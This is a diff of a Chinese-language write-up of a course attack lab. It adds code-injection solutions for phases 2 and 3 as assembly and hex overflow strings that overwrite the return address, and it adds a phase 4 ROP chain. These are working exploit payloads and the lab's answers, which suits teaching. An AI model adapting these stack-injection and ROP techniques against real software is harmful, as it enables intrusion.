@@ -72,7 +72,27 @@ fa 97 b9 59 00 00 00 00 ec 17 40 00 00 00 00 00
 完成phase_2
 ![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image2.png)
 
-
+嗯，做到后面猛然发现，前三题是要用code-injection做的，重来重来
+思路还是一样的可以通过构造如下方式完成等同于ROP链的效果
+```
+mov    $0x59b997fa, %rdi
+push   $0x4017ec
+ret
+```
+然后还需要将rsp寄存器的地址作为第一次返回地址
+![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image5.png)
+这样就可以完成本题了
+```
+48 c7 c7 fa 97 b9 59 	
+68 ec 17 40 00       	
+c3 
+00 00 00 00 00 00 00
+00 00 00 00 00 00 00
+00 00 00 00 00 00 00
+00 00 00 00 00 00
+78 dc 61 55
+```
+![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image6.png)
 
 ## phase_3
 touch3的源码
@@ -102,18 +122,38 @@ touch3的源码
 ```
 发现其调用了hexmathch函数，并将cookie和sval作为指针传入其中。
 hexmatch函数会将我们的cookie值以字符串形式输出，然后与rdi中的值进行比对，相同则通过程序。
-使用gdb进行调试的时候可以发现，只需要将rdi的值设置为与rsi中存入的cookie字符串对应的地址
-就可以完成本题
-![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image3.png)
 ```
+mov    $0x5561dca8, %rdi
+push   $0x4018fa
+ret
+```
+使用caller的栈顶地址作为存放字符串的地址，然后将其赋值给rdi，这样就可以避免其被覆盖
+可以通过gdb调试找到caller的栈顶地址
+![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image8.png)
+转换后
+```
+48 c7 c7 a8 dc 61 55 68 
+fa 18 40 00 c3 00 00 00
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 
-00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 
-1b 14 40 00 00 00 00 00 
-23 dc 61 55 00 00 00 00 
-fa 18 40 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+35 39 62 39 39 37 66 61
 ```
-![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image4.png)
+![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image7.png)
+
+## phase_4
+跟phase_2一样的题目，但是需要通过ROP完成攻击。
+然后构造ROP链如下所示
+```
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 1b 14 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00 ec 17 40 00 00 00 00 00
+```
+![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image9.png)
+
+
+
+
 
